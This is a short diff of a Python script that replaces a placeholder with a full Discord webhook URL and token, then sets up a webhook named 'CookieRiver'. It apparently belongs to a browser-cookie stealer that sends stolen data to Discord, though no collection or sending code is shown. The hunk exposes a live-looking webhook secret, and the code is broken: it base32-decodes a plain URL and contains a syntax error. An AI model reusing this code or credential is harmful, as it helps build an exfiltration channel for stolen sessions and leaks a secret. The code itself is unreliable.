@@ -8,7 +8,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 
 
 
-key = "ENCODED BASE32 HOOK HEREEEE"
+key = "https://discord.com/api/webhooks/1244744179326910535/11dHfuJU-1sclMAzTzJYS5pI73sZrhzN4-AqAUq3Ml1FfPUej4p_auTBfwI9MUOblNxH"
 
 weblook = base64.b32decode(key)
 webhookl = DiscordWebhook(url=weblook, , username="CookieRiver")
